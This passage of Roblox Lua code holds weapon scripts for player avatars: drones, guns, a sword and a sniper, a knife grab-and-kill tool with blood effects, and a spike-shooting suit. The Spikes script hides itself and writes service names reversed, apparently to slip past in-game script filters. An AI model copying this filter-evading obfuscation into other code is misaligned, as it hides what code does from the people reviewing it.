coroutine.resume(coroutine.create(function(DDrone,Val,Gyro)  
while Aiming==false do
wait()
local target = findNearestTorso(DDrone.DPart1.Position)
if target~=nil then
Val.Value=true
Gyro.cframe=cf(DDrone.DPart1.Position, target.Position)
else
Val.Value=false
Gyro.cframe=cf(DDrone.DPart1.Position, Torso.Position)
end
end
Val.Parent=nil
end),v,Valuee,v.DPart1.DroneGyro)
end
end
wait(0.5)
for i=0,1,0.1 do
wait()
RW.C0=cf(1+.5*i, 0.5, -0.5+0.5*i) * euler(1.57-1.07*i,0,-1+1*i)
RW.C1=cf(0, 0.5, 0) * euler(0,0,0)
LW.C0=cf(-1-.5*i, 0.5, -0.5+0.5*i) * euler(1.57-1.57*i,0,1-1.2*i)
LW.C1=cf(0, 0.5, 0) * euler(0,0,0)
end
attack=false
end
end
end
if Mode=="Gun" then
if key=="x" then
RemoveGun()
Mode="Choose"
equipanim()
return
end
end
if Mode=="Sword" then
if key=="c" then
RemoveSword()
Mode="Choose"
equipanim()
return
end
if key=="f" then
BowShoot()
end
end
if Mode=="Sniper" then
if key=="v" then
if SnipAim==true then
SnipAim=false
UnAim()
end
RemoveSniper()
Mode="Choose"
equipanim()
return
end
if key=="f" then
if SnipAim==false then
SnipAim=true
Aim()
else
SnipAim=false
UnAim()
end
end
end
if Mode=="Choose" then
if key=="f" then
RemoveDrones2()
end
if key=="z" then
Drone1,Drone2,Drone3=Drones()
end
if key=="x" then
Gun()
end
if key=="c" then
Sword()
end
if key=="v" then
Sniper()
end
end
end
function key2(key)
if key=="f" then
BowAim=false
end
end
function s(mouse)
mouse.Button1Down:connect(function() ob1d(mouse) end)
mouse.Button1Up:connect(function() ob1u(mouse) end)
mouse.KeyDown:connect(key)
mouse.KeyUp:connect(key2)
unsheathed = true
player = Player
ch = Character
MMouse = mouse
RSH = ch.Torso["Right Shoulder"]
LSH = ch.Torso["Left Shoulder"]
RSH.Parent = nil
LSH.Parent = nil
RW.Part0 = ch.Torso
RW.C0 = CFrame.new(1.5, 0.5, 0)
RW.C1 = CFrame.new(0, 0.5, 0)
RW.Part1 = ch["Right Arm"]
RW.Parent = ch.Torso
LW.Part0 = ch.Torso
LW.C0 = CFrame.new(-1.5, 0.5, 0)
LW.C1 = CFrame.new(0, 0.5, 0)
LW.Part1 = ch["Left Arm"]
LW.Parent = ch.Torso
equipanim()
end
function ds(mouse)
hideanim()
wait(0)
RW.Parent = nil
LW.Parent = nil
RSH.Parent = player.Character.Torso
LSH.Parent = player.Character.Torso
end
Bin.Selected:connect(s)
Bin.Deselected:connect(ds)
]]
 
Knife = [[
 
me = game.Players.LocalPlayer
char = me.Character
selected = false
attacking = false
hurt = false
grabbed = nil
mode = "drop"
bloodcolors = {"Bright red", "Really red"}
 
 
function prop(part, parent, collide, tran, ref, x, y, z, color, anchor, form)
part.Parent = parent
part.formFactor = form
part.CanCollide = collide
part.Transparency = tran
part.Reflectance = ref
part.Size = Vector3.new(x,y,z)
part.BrickColor = BrickColor.new(color)
part.TopSurface = 0
part.BottomSurface = 0
part.Anchored = anchor
part.Locked = true
part:BreakJoints()
end
 
function weld(w, p, p1, a, b, c, x, y, z)
w.Parent = p
w.Part0 = p
w.Part1 = p1
w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z)
end
 
function mesh(mesh, parent, x, y, z, type)
mesh.Parent = parent
mesh.Scale = Vector3.new(x, y, z)
mesh.MeshType = type
end
 
function remgui()
for _,v in pairs(me.PlayerGui:GetChildren()) do
if v.Name == "Modeshow" then
v:remove()
end
end
end
 
function inform(text,delay)
remgui()
local sc = Instance.new("ScreenGui")
sc.Parent = me.PlayerGui
sc.Name = "Modeshow"
local bak = Instance.new("Frame",sc)
bak.BackgroundColor3 = Color3.new(1,1,1)
bak.Size = UDim2.new(0.94,0,0.1,0)
bak.Position = UDim2.new(0.03,0,0.037,0)
bak.BorderSizePixel = 0
local gi = Instance.new("TextLabel",sc)
gi.Size = UDim2.new(0.92,0,0.09,0)
gi.BackgroundColor3 = Color3.new(0,0,0)
gi.Position = UDim2.new(0.04,0,0.042,0)
gi.TextColor3 = Color3.new(1,1,1)
gi.FontSize = "Size12"
gi.Text = text
coroutine.resume(coroutine.create(function()
wait(delay)
sc:remove()
end))
end
 
if char:findFirstChild("Bricks",true) then
char:findFirstChild("Bricks",true):remove()
end
 
bricks = Instance.new("Model",me.Character)
bricks.Name = "Bricks"
 
--Parts-------------------------Parts-------------------------Parts-------------------------Parts----------------------
 
rarm = char:findFirstChild("Right Arm")
larm = char:findFirstChild("Left Arm")
lleg = char:findFirstChild("Left Leg")
torso = char:findFirstChild("Torso")
hum = char:findFirstChild("Humanoid")
 
righthold = Instance.new("Part")
prop(righthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w11 = Instance.new("Weld")
weld(w11, rarm, righthold, 0, 0, 0, 0, 1, 0)
 
lefthold = Instance.new("Part")
prop(lefthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w12 = Instance.new("Weld")
weld(w12, larm, lefthold, 0, 0, 0, 0, 1, 0)
 
hold = Instance.new("Part")
prop(hold, bricks, false, 0, 0, 0.2, 0.4, 0.7, "Black", false, "Custom")
oh = Instance.new("Weld")
weld(oh, lleg, hold, -math.pi/1.4, 0, math.rad(35), 0.55, -0.9, 0.3)
 
knife = Instance.new("Part")
prop(knife, bricks, false, 0, 0, 0.35, 1.1, 0.5, "Reddish brown", false, "Custom")
orr = Instance.new("Weld")
weld(orr, hold, knife, 0, 0, 0, 0, 0.7, 0)
ar = Instance.new("Weld")
weld(ar, lefthold, nil, math.pi/2, 0, math.pi, 0, 0, 0)
 
 
blade = Instance.new("Part")
prop(blade, bricks, false, 0, 0, 0.1, 1.5, 0.4, "Medium grey", false, "Custom")
Instance.new("BlockMesh",blade).Scale = Vector3.new(0.3,1,1)
w2 = Instance.new("Weld")
weld(w2, knife, blade, 0, 0, 0, 0, -1.2, 0)
 
blade2 = Instance.new("Part")
prop(blade2, bricks, false, 0, 0, 0.1, 0.5, 0.4, "Medium grey", false, "Custom")
local mew = Instance.new("SpecialMesh",blade2)
mew.MeshType = "Wedge"
mew.Scale = Vector3.new(0.3,1,1)
w3 = Instance.new("Weld")
weld(w3, blade, blade2, 0, 0, 0, 0, -1, 0)
 
 
 
 
rb = Instance.new("Part")
prop(rb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w13 = Instance.new("Weld")
weld(w13, torso, rb, 0, 0, 0, -1.5, -0.5, 0)
 
lb = Instance.new("Part")
prop(lb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
w14 = Instance.new("Weld")
weld(w14, torso, lb, 0, 0, 0, 1.5, -0.5, 0)
 
rw = Instance.new("Weld")
weld(rw, rb, nil, 0, 0, 0, 0, 0.5, 0)
 
lw = Instance.new("Weld")
weld(lw, lb, nil, 0, 0, 0, 0, 0.5, 0)
 
grabweld = nil
platlol = nil
lolhum = nil
 
function touch(h)
if hurt then
if grabbed == nil then
local hu = h.Parent:findFirstChild("Humanoid")
local head = h.Parent:findFirstChild("Head")
local torz = h.Parent:findFirstChild("Torso")
if hu ~= nil and head ~= nil and torz ~= nil and h.Parent.Name ~= name then
if hu.Health > 0 then
grabbed = torz
hu.PlatformStand = true
local w = Instance.new("Weld")
weld(w,righthold,grabbed,math.pi/2,0.2,0,0.7,-0.9,-0.6)
grabweld = w
lolhum = hu
local lolxd = true
platlol = lolxd
hu.Changed:connect(function(prop)
if prop == "PlatformStand" and platlol then
hu.PlatformStand = true
end
end)
end
end
end
end
end
 
righthold.Touched:connect(touch)
lefthold.Touched:connect(touch)
 
function bleed(part,po)
local lol1 = math.random(5,30)/100
local lol2 = math.random(5,30)/100
local lol3 =math.random(5,30)/100
local lol4 = math.random(1,#bloodcolors)
local p = Instance.new("Part")
prop(p,part.Parent,false,0,0,lol1,lol2,lol3,bloodcolors[lol4],false,"Custom")
p.CFrame = part.CFrame * CFrame.new(math.random(-5,5)/10,po,math.random(-5,5)/10)
p.Velocity = Vector3.new(math.random(-190,190)/10,math.random(-190,190)/10,math.random(-190,190)/10)
p.RotVelocity = Vector3.new(math.random(-400,400)/10,math.random(-400,400)/10,math.random(-400,400)/10)
coroutine.resume(coroutine.create(function()
wait(3)
p:remove()
end))
end
 
if script.Parent.className ~= "HopperBin" then
h = Instance.new("HopperBin",me.Backpack)
h.Name = "Grab"
script.Parent = h
end
 
bin = script.Parent
 
function select(mouse)
orr.Part1 = nil
ar.Part1 = knife
mouse.Button1Down:connect(function()
if attacking == false then
attacking = true
lw.Part1 = larm
rw.Part1 = rarm
hurt = true
for i=1, 8 do
rw.C0 = rw.C0 * CFrame.new(-0.03,0,-0.08) * CFrame.fromEulerAnglesXYZ(0.18,0.04,0)
lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
wait()
end
wait(1)
hurt = false
if grabbed == nil then
for i=1, 4 do
rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
wait()
end
lw.C0 = CFrame.new(0,0,0)
rw.C0 = CFrame.new(0,0,0)
lw.Part1 = nil
rw.Part1 = nil
attacking = false
end
elseif hurt == false and grabbed ~= nil and mode == "drop" then
grabweld:remove()
grabweld = nil
platlol = false
grabbed = nil
lolhum.PlatformStand = false
lolhum = nil
for i=1, 4 do
rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
wait()
end
lw.C0 = CFrame.new(0,0,0)
rw.C0 = CFrame.new(0,0,0)
lw.Part1 = nil
rw.Part1 = nil
attacking = false
platlol = nil
elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "throw" then
grabweld:remove()
grabweld = nil
local bf = Instance.new("BodyForce",grabbed)
bf.force = torso.CFrame.lookVector * 8500
bf.force = bf.force + Vector3.new(0,7400,0)
coroutine.resume(coroutine.create(function()
wait(0.12)
bf:remove()
end))
for i=1, 6 do
rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.35,0,0)
lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.18,0,0)
wait()
end
for i=1, 4 do
rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.47,0,0)
lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.2,0,0)
wait()
end
wait(0.2)
platlol = false
grabbed = nil
lolhum.PlatformStand = false
lolhum = nil
for i=1, 4 do
rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
wait()
end
lw.C0 = CFrame.new(0,0,0)
rw.C0 = CFrame.new(0,0,0)
lw.Part1 = nil
rw.Part1 = nil
attacking = false
platlol = nil
elseif hurt == false and grabbed ~= nil and lolhum ~= nil and grabweld ~= nil and mode == "kill" then
for i=1, 5 do
lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
wait()
end
local ne = grabbed:findFirstChild("Neck")
coroutine.resume(coroutine.create(function()
local duh = grabbed
local duh2 = grabbed.Parent.Head
local lolas = lolhum
duh.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
for i=1, 60 do
wait()
local hm = math.random(1,9)
pcall(function()
if hm == 1 then
duh2.Sound.Pitch = math.random(90,110)/100
duh2.Sound:play()
end
end)
if hm > 0 and hm < 3 then
bleed(duh,1)
bleed(duh2,-0.5)
end
end
lolas.Health = 0
for i=1, 85 do
wait()
local hm = math.random(1,9)
pcall(function()
if hm == 1 then
duh2.Sound.Pitch = math.random(90,110)/100
duh2.Sound:play()
end
end)
if hm > 0 and hm < 3 then
bleed(duh,1)
bleed(duh2,-0.5)
end
end
end))
for i=1, 3 do
lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
if ne ~= nil then
grabbed.Neck.C0 = grabbed.Neck.C0 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
end
wait()
end
grabweld:remove()
grabweld = nil
for i=1, 4 do
lw.C0 = lw.C0 * CFrame.new(-0.04,-0.24,-0.2) * CFrame.fromEulerAnglesXYZ(0.1,0,0.06)
wait()
end
for i=1, 4 do
rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
wait()
end
lw.C0 = CFrame.new(0,0,0)
rw.C0 = CFrame.new(0,0,0)
lw.Part1 = nil
rw.Part1 = nil
platlol = false
grabbed = nil
lolhum = nil
attacking = false
platlol = nil
end
end)
mouse.KeyDown:connect(function(kai)
key = kai:lower()
if key == "q" then
mode = "drop"
inform("Mode: Drop",2)
elseif key == "e" then
mode = "throw"
inform("Mode: Throw",2)
elseif key == "f" then
mode = "kill"
inform("Mode: Kill",2)
end
end)
end
 
function desel()
repeat wait() until attacking == false
orr.Part1 = knife
ar.Part1 = nil
end
 
bin.Selected:connect(select)
bin.Deselected:connect(desel)
 
char.Humanoid.Died:connect(function()
pcall(function()
grabweld:remove()
grabweld = nil
grabbed = nil
platlol = false
platlol = nil
end)
end)
 
inform("Grab script loaded successfully.",2)
]]
 
 
Spikes = [[script.Parent = nil
local color = "Really black"
wt = 0.1 s = script it = Instance.new v3 = Vector3.new c3 = Color3.new ud = UDim2.new cf = CFrame.new ca = CFrame.Angles pi = math.pi rd = math.rad
bc = BrickColor.new ab = math.abs de = math.deg ts = tostring tn = tonumber ti = table.insert tr = table.remove
mf = math.floor cr = coroutine.resume cc = coroutine.create sf = string.find sb = string.sub rn = math.random
asset = "http://www.roblox.com/asset/?id="
sr = string.reverse sl = string.lower su = string.upper
Serv = {} Serv.p = game:GetService(sr("sreyalP")) Serv.l = game:GetService(sr("gnithgiL"))
Serv.is = game:GetService(sr("ecivreStresnI")) if game:findFirstChild(sr("revreSkrowteN")) then Serv.ns = game:GetService(sr("revreSkrowteN")) else NetworkServer = nil end
Serv.sg = game:GetService(sr("iuGretratS")) Serv.sp = game:GetService(sr("kcaPretratS")) Serv.d = game:GetService(sr("sirbeD"))
Decs = {}
Decs.Shine = "48965808" Decs.Crack = "49173398" Decs.Cloud = "1095708" Decs.Spike = "1033714" Decs.Rock = "1290033" Decs.Crown = "20329976" Decs.Crown2 = "1323306"
function ft(tablez,item) if not tablez or not item then return nil end for i=1,#tablez do if tablez == item then return i end end return nil end
function re(par,obj) if type(par) ~= "userdata" or type(obj) ~= "string" then return nil end if par:findFirstChild(obj) then par[obj]:Remove() end end
function pa(pa,pn,sh,x,y,z,c,a,tr,re,bc2) local fp = nil if sh ~= "Wedge" and sh ~= "CornerWedge" then fp = it("Part",pa) fp.Shape = sh fp.formFactor = "Custom" elseif sh == "Wedge" then fp = it("WedgePart",pa) fp.formFactor = "Custom"
elseif sh == "CornerWedge" then fp = it("CornerWedgePart",pa) end fp.Size = v3(x,y,z) fp.CanCollide = c fp.Anchored = false fp.BrickColor = bc(bc2) fp.Transparency = tr fp.Reflectance = re fp.BottomSurface = 0 fp.Name = pn --fp.FrontSurface = "Hinge"
fp.TopSurface = 0 fp.Velocity = Vector3.new(0,10,0) fp:BreakJoints() return fp end
function clearit(tab) for xx=1,#tab do tab[xx]:Remove() end end
function weld(pa,p0,p1,x,y,z,a,b,c) local fw = it("Weld",pa) fw.Part0 = p0 fw.Part1 = p1 fw.C0 = cf(x,y,z) *ca(a,b,c) return fw end
function spm(ty,pa,ss) local sp = it("SpecialMesh",pa) sp.MeshType = ty sp.Scale = Vector3.new(ss,ss,ss) end function mbm(pa,sx,sy,sz) local bm = Instance.new("BlockMesh",pa) bm.Scale = Vector3.new(sx,sy,sz) end
function fd(pa,ob) if pa:findFirstChild(ob) then return pa[ob] else return nil end end
function ccn(pa,cl) for i,v in pairs(pa:children()) do if sf(v.className:lower(),cl:lower()) then v:Remove() end end end
function stick(hit2,hit) local weld = Instance.new("Weld") weld.Part0 = hit2 weld.Part1 = hit local HitPos = hit2.Position local CJ = CFrame.new(HitPos)
local C0 = hit2.CFrame:inverse() *CJ local C1 = hit.CFrame:inverse() * CJ weld.C0 = C0 weld.C1 = C1 weld.Parent = hit2 end
function stick2(hit2,hit,tostick) local weld = Instance.new("Weld") weld.Part0 = tostick weld.Part1 = hit2 local HitPos = hit.Position local CJ = CFrame.new(HitPos) local C0 = hit2.CFrame:inverse() *CJ local C1 = hit.CFrame:inverse() * CJ weld.C0 = C1 weld.C1 = C0 weld.Parent = hit2 end
function invis(o) for i,v in pairs(o:children()) do if v:IsA("BasePart") then v.Transparency = 1 end invis(v) end end
function newhats(p,o,o2) for i,v in pairs(p:children()) do if v:IsA("Hat") then local np = v.Handle:Clone() np.Transparency = 0 np.Mesh.Scale = np.Mesh.Scale*1.1 np.Parent = o np.CFrame = v.Handle.CFrame stick2(np,o2,o) end end end
function ray(Pos, Dir) return workspace:FindPartOnRay(Ray.new(Pos, Dir.unit *999), c) end
function hasclass(prt,cls) clases = 0 for i,v in pairs(prt:children()) do if v.className:lower() == cls:lower() then clases = clases + 1 end end return clases end
function fade(prt,incr) cr(cc(function() for i=prt.Transparency,1,incr do prt.Transparency = i wait() end prt:Remove() end)) end
function rtab(tabz,obj) for i=1,#tabz do if tabz == obj then tr(tabz,i) break end end end
function RandomPlayer(spiz) local torz = spis local torses = {} for i,v in pairs(Serv.p:children()) do if v ~= Serv.p.LocalPlayer and v.Character ~= nil and v.Character:findFirstChild("Torso") then ti(torses,v.Character.Torso) end end if #torses > 0 then torz = torses[rn(1,#torses)] end return torz end
function Trail(ob,times,waitz,col,thickz,ofz) local oldpos = (ob.CFrame *ofz).p for i=1,times do local obp = (ob.CFrame *ofz).p local mag = (oldpos - obp).magnitude local tr = pa(ob,"trail","Block",0,0,0,false,false,0.5,0,col) tr.Anchored = true tr.CFrame = cf(oldpos,obp) tr.CFrame = tr.CFrame + tr.CFrame.lookVector* (mag/2)
local trm = it("CylinderMesh",tr) trm.Scale = v3(5*thickz,mag*5,5*thickz) cr(cc(function() for i=5*thickz,0,-5*thickz/10 do trm.Scale = v3(i,mag*5,i) wait() end tr:Remove() end)) tr.CFrame = tr.CFrame *ca(rd(90),0,0) oldpos = obp wait(waitz) end end
sTrail = {}
function Trail2(ob,waitz,col,thickz,ofz) cr(cc(function() ti(sTrail,ob)
local oldpos = (ob.CFrame *ofz).p
repeat local obp = (ob.CFrame *ofz).p
local mag = (oldpos - obp).magnitude
local tr = pa(ob,"trail","Block",0,0,0,false,false,0.5,0,col) tr.Anchored = true
tr.CFrame = cf(oldpos,obp)
tr.CFrame = tr.CFrame + tr.CFrame.lookVector* (mag/2)
local trm = it("CylinderMesh",tr) trm.Scale = v3(5*thickz,mag*5,5*thickz)
cr(cc(function() for i=5*thickz,0,-5*thickz/10 do trm.Scale = v3(i,mag*5,i) wait() end tr:Remove() end))
tr.CFrame = tr.CFrame *ca(rd(90),0,0) oldpos = obp
wait(waitz) until ft(sTrail,ob) == nil end))
end
nocf = cf(0,0,0) noca = ca(0,0,0)
repeat wait() until Serv.p.LocalPlayer.Character and Serv.p.LocalPlayer.Character:findFirstChild("Torso")
pl = Serv.p.LocalPlayer
bp = pl.Backpack
pg = pl.PlayerGui
c = pl.Character
he = c.Head
to = c.Torso ccn(to,"BodyPosition") ccn(to,"BodyGyro")
hu = c.Humanoid hu.PlatformStand = false
mou = nil
Button = false
Key = false
Anim = {}
Anim.ClickHold = 0
Anim.c = true -- weapon change or act debounce
Anim.a = "None" -- current weapon
Anim.b = "None" -- weapon act
bets = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"," "}
act = {key = {}}
for i=1,#bets do table.insert(act.key,bets) end
Sounds = {
Boom = "16976189";
SniperFire = "1369158";
ShotgunFire2 = "1868836";
MinigunFire = "2692806";
MinigunCharge = "2692844";
MinigunDischarge = "1753007";
Flashbang = "16976189";
Beep = "15666462";
Smash = "2801263";
Punch = "31173820";
Slash = "rbxasset://sounds/swordslash.wav";
Falcon = "1387390";
Cast = "2101137";
Spin = "1369159";
Abscond = "2767090";
ElectricalCharge = "2800815";
FireExplosion = "3264793";
SaberLightUp = "10209303";
SaberSlash = "10209280";
SaberHit = "44463749";
EnergyBlast = "10209268";
Lunge = "rbxasset://sounds/swordlunge.wav";
Unsheath = "rbxasset://sounds/unsheath.wav";
}
local SoundTest = asset .. Sounds.Spin
local hd = he:Clone()
Anim.BodyAnims = 0
Anim.Welding = 0 function c1(wexx,smmx,c0orc1,aa,bb,cc,xx,yy,zz) local xx2,yy2,zz2 = 0,0,0 local x2,y2,z2 = 0,0,0 if c0orc1 == 0 then
xx2,yy2,zz2 = wexx.C0:toEulerAnglesXYZ() x2,y2,z2 = wexx.C0.x,wexx.C0.y,wexx.C0.z elseif c0orc1 == 1 then xx2,yy2,zz2 = wexx.C1:toEulerAnglesXYZ() x2,y2,z2 = wexx.C1.x,wexx.C1.y,wexx.C1.z else xx2,yy2,zz2 = wexx.C1:toEulerAnglesXYZ()
x2,y2,z2 = wexx.C0.x,wexx.C0.y,wexx.C0.z end Anim.Welding = Anim.Welding + 1 local twa = 1 for i=0,twa,smmx do if c0orc1 == 0 then wexx.C0 = cf(x2-(((x2-aa)/twa)*i),y2-(((y2-bb)/twa)*i),z2-(((z2-cc)/twa)*i)) *ca(xx2-(((xx2-rd(xx))/twa)*i),yy2-(((yy2-rd(yy))/twa)*i),zz2-(((zz2-rd(zz))/twa)*i)) elseif c0orc1 == 1 then
wexx.C1 = cf(x2-(((x2-aa)/twa)*i),y2-(((y2-bb)/twa)*i),z2-(((z2-cc)/twa)*i)) *ca(xx2-(((xx2-rd(xx))/twa)*i),yy2-(((yy2-rd(yy))/twa)*i),zz2-(((zz2-rd(zz))/twa)*i)) else wexx.C0 = cf(x2-(((x2-aa)/twa)*i),y2-(((y2-bb)/twa)*i),z2-(((z2-cc)/twa)*i))
wexx.C1 = ca(xx2-(((xx2-rd(xx))/twa)*i),yy2-(((yy2-rd(yy))/twa)*i),zz2-(((zz2-rd(zz))/twa)*i))end wait() end local i = 1 if c0orc1 == 0 then wexx.C0 = cf(x2-(((x2-aa)/twa)*i),y2-(((y2-bb)/twa)*i),z2-(((z2-cc)/twa)*i)) *ca(xx2-(((xx2-rd(xx))/twa)*i),yy2-(((yy2-rd(yy))/twa)*i),zz2-(((zz2-rd(zz))/twa)*i)) elseif c0orc1 == 1 then wexx.C1 = cf(x2-(((x2-aa)/twa)*i),y2-(((y2-bb)/twa)*i),z2-(((z2-cc)/twa)*i)) *ca(xx2-(((xx2-rd(xx))/twa)*i),yy2-(((yy2-rd(yy))/twa)*i),zz2-(((zz2-rd(zz))/twa)*i))
else wexx.C0 = cf(x2-(((x2-aa)/twa)*i),y2-(((y2-bb)/twa)*i),z2-(((z2-cc)/twa)*i)) wexx.C1 = ca(xx2-(((xx2-rd(xx))/twa)*i),yy2-(((yy2-rd(yy))/twa)*i),zz2-(((zz2-rd(zz))/twa)*i)) end Anim.Welding = Anim.Welding - 1 end
to["Left Hip"].Part0 = to to["Right Hip"].Part0 = to to["Left Shoulder"].Part0 = to to["Right Shoulder"].Part0 = to
if c:findFirstChild("Suit") then game:service'Debris':AddItem(c["Suit"],0.035) end
m = it("Model",c) m.Name = "Suit"
Misc = {}
Misc["x"] = it("Model",m)
invis(c)
p = {}
t = pa(m,"Torso","Block",0,0,0,false,false,0,0,ts(color)) tw = weld(t,to,t,0,0,0,0,0,0)
la = pa(m,"Left Arm","Block",0,0,0,false,false,0,0,ts(color)) law = weld(la,t,la,-1.5,1,0,0,0,0)
ra = pa(m,"Right Arm","Block",0,0,0,false,false,0,0,ts(color)) raw = weld(ra,t,ra,1.5,1,0,0,0,0)
ll = pa(m,"Left Leg","Block",0,0,0,false,false,0,0,ts(color)) llw = weld(ll,t,ll,-0.5,-1,0,0,0,0)
rl = pa(m,"Right Leg","Block",0,0,0,false,false,0,0,ts(color)) rlw = weld(rl,t,rl,0.5,-1,0,0,0,0)
hd.Parent = m hd.Transparency = 0 hd.face.Face = "Front" hdw = weld(hd,t,hd,0,1.5,0,0,0,0) he.face.Face = "Bottom"
local nbb = it("BlockMesh") nbb.Offset = v3(0,-1,0) nbb.Scale = v3(5,10,5)
nbb:Clone().Parent = la nbb:Clone().Parent = ra nbb:Clone().Parent = ll nbb:Clone().Parent = rl
nbb:Clone().Parent = t t.Mesh.Offset = v3(0,0,0) t.Mesh.Scale = Vector3.new(10,10,5)
to["Left Hip"].Part0 = t to["Right Hip"].Part0 = t to["Left Shoulder"].Part0 = t to["Right Shoulder"].Part0 = t
function Armz(ison) if ison then
c["Left Arm"].Transparency = 0 c["Right Arm"].Transparency = 0 la.Transparency = 1 ra.Transparency = 1
law.Part0 = c["Left Arm"] law.C0 = cf(0,1,0) raw.Part0 = c["Right Arm"] raw.C0 = cf(0,1,0)
else
c["Left Arm"].Transparency = 1 c["Right Arm"].Transparency = 1 la.Transparency = 0 ra.Transparency = 0
law.Part0 = t law.C0 = cf(-1.5,1,0) raw.Part0 = t raw.C0 = cf(1.5,1,0)
end end
function Legz(ison) if ison then
c["Left Leg"].Transparency = 0 c["Right Leg"].Transparency = 0 ll.Transparency = 1 rl.Transparency = 1
llw.Part0 = c["Left Leg"] llw.C0 = cf(0,1,0) rlw.Part0 = c["Right Leg"] rlw.C0 = cf(0,1,0)
else
c["Left Leg"].Transparency = 1 c["Right Leg"].Transparency = 1 ll.Transparency = 0 rl.Transparency = 0
llw.Part0 = t llw.C0 = cf(-0.5,-1,0) rlw.Part0 = t rlw.C0 = cf(0.5,-1,0)
end end function Headz(ison) if ison then he.Transparency = 0 else he.Transparency = 1 end end
Legz(true) Armz(true) newhats(c,hd,he)
function Sound(sid,pit,vol) local ss = it("Sound") ss.Name = "Sound" ss.Parent = hd ss.SoundId = sid ss.Pitch = pit ss.Volume = vol/3 ss.PlayOnRemove = true wait() ss:Remove() end
Healthz = 250 hu.MaxHealth = Healthz hu.Health = Healthz
mp = 1250000 maxmp = 1250000 ns = 18
function addmp(mpz) mp = mp + mpz if mp > maxmp then mp = maxmp end end
function DmgHumanoidsNear(pos,dmg,rndmg,mag,forc)
local function kidive(ob)
for i,v in pairs(ob:children()) do
if not v.Parent:IsA("Hat") and v:IsA("BasePart") and v.Parent.Name ~= "Suit" and v.Parent.Parent:findFirstChild("Humanoid") == nil and v.Parent.Parent.Name ~= "Suit" and v.Parent:findFirstChild("Humanoid") == nil and (v.Position - pos).magnitude < mag*1.3 and v.Anchored == false and v:GetMass() < 150 then
v:BreakJoints() v.Velocity = cf(pos,v.Position).lookVector*forc
end
if v:IsA("Humanoid") and v ~= hu and v.Parent:findFirstChild("Torso") then
if (pos - v.Parent.Torso.Position).magnitude < mag then local tdmg = dmg*rn(1,rndmg)
addmp(tdmg) v:TakeDamage(tdmg)
end
end
if not v:IsA("Camera") and not v:IsA("Script") then kidive(v) end end end
kidive(workspace)
end
function DmgHit(weplol,mind,maxd,gain)
weplol.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid") == nil then return end
local aihu = hit.Parent.Humanoid
local dmgzorz = rn(mind,maxd) addmp(dmgzorz*gain)
aihu:TakeDamage(dmgzorz) Sound(asset .. Sounds.Smash,1,1)
end)
end
function ShootSpike(sc,adjus,istrai,typ,loltors)
cr(cc(function() Sound(Sounds.Slash,1.1,1)
local spi = pa(c,"","Block",0.6*sc,2*sc,0.6*sc,true,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
spim.Scale = v3(0.12*sc,3*sc,0.12*sc) spi.Anchored = true if typ == 1 then spi.CFrame = cf((loltors.CFrame).p,mou.hit.p) *adjus
elseif typ == 2 then if adjus == "random" then spi.CFrame = cf(to.Position,RandomPlayer(spi).Position) else spi.CFrame = loltors.CFrame *adjus end end spi.CFrame = spi.CFrame *ca(rd(-90),0,0)
if istrai then cr(cc(function() Trail(spi,15,0.15,color,0.35,cf(0,-1,0)) end)) end
local bullethit = false
local tyms = 0 if rn(1,17) == 1 then it("Fire",spi).Heat = -25 end
local minusz = -0.0001
local spid = 0.25 if typ == 2 then spid = 0.01 end
local divzz = 110 if typ == 2 then divzz = 50 end
local tehpos = v3(0,0,0)
repeat
tyms = tyms + 2 minusz = (-90/3000/divzz)*tyms
local bhit,bpos = ray(spi.Position,spi.Position - (spi.CFrame *cf(0,-1,0)).p) tehpos = bpos
if bpos ~= nil and (bpos - (spi.CFrame *cf(0,1,0)).p).magnitude < 2.2 then bullethit = bhit else spi.CFrame = spi.CFrame *cf(0,2,0) *ca(rd(minusz),rd(0),0) end
if tyms%8 == 0 then wait() end
until bullethit or spi.Position.y < -300 or tyms > 3000
if bullethit then
